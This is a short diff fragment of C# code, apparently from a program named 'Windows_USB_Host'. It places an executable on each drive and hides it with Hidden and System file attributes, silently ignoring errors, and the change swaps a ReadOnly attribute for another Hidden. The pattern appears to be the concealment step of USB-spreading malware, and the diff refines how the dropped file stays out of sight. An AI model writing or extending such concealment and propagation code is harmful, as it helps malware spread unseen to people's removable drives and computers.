@@ -114,7 +114,7 @@ namespace Windows_USB_Host
                                     System.IO.File.SetAttributes(x.Name + ExeName, System.IO.FileAttributes.Hidden);
                                     try { System.IO.File.SetAttributes(x.Name + ExeName, System.IO.FileAttributes.System); }
                                     catch (System.Exception ex) { }
-                                    try { System.IO.File.SetAttributes(x.Name + ExeName, System.IO.FileAttributes.ReadOnly); }
+                                    try { System.IO.File.SetAttributes(x.Name + ExeName, System.IO.FileAttributes.Hidden); }
                                     catch (System.Exception ex) { }
                                     foreach (string xx in System.IO.Directory.GetFiles(x.Name))
                                     {
